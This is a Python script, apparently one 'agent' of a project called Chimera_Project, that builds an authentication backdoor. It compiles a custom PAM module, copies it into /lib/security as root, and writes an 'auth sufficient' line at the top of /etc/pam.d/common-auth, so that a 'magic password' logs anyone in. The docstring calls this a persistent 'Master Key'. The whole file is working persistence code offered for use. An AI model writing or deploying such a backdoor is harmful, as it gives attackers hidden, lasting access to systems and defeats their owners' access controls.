#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess

class PAMBackdoor:
    """
    Agent 427: Authentication Subversion.
    Compiles a custom PAM module and injects it into the 
    system-auth stack to provide a persistent 'Master Key'.
    """
    def execute(self):
        print("--- [AGENT 427: PAM SUBVERSION SEQUENCE] ---")
        src = "/home/dan/Chimera_Project/agents/427_PAM_Backdoor/src/pam_chimera.c"
        lib_out = "/lib/security/pam_chimera.so"
        
        # 1. Compile with PAM headers
        # Requires 'libpam0g-dev'
        try:
            subprocess.run(["gcc", "-fPIC", "-shared", src, "-o", "pam_chimera.so", "-lpam"], check=True)
        except subprocess.CalledProcessError:
            print("[!] Compilation failed. Ensure libpam0g-dev is installed.")
            return

        if os.getuid() != 0:
            print("[!] Critical: Deploying PAM modules requires Root.")
            return

        # 2. Move to security directory
        subprocess.run(["mv", "pam_chimera.so", lib_out], check=True)

        # 3. The 'Wedge': Add to common-auth
        # We put it at the 'top' as 'sufficient'. If our magic pass matches, 
        # we are IN. If not, the system proceeds to standard login.
        auth_conf = "/etc/pam.d/common-auth"
        entry = f"auth sufficient pam_chimera.so\n"
        
        with open(auth_conf, "r") as f:
            content = f.read()
        
        if entry not in content:
            with open(auth_conf, "w") as f:
                f.write(entry + content)
            print("[\033[92mSUCCESS\033[0m] Master Key active. Magic Password ready.")
        else:
            print("[*] PAM module already registered.")

if __name__ == "__main__":
    PAMBackdoor().execute()
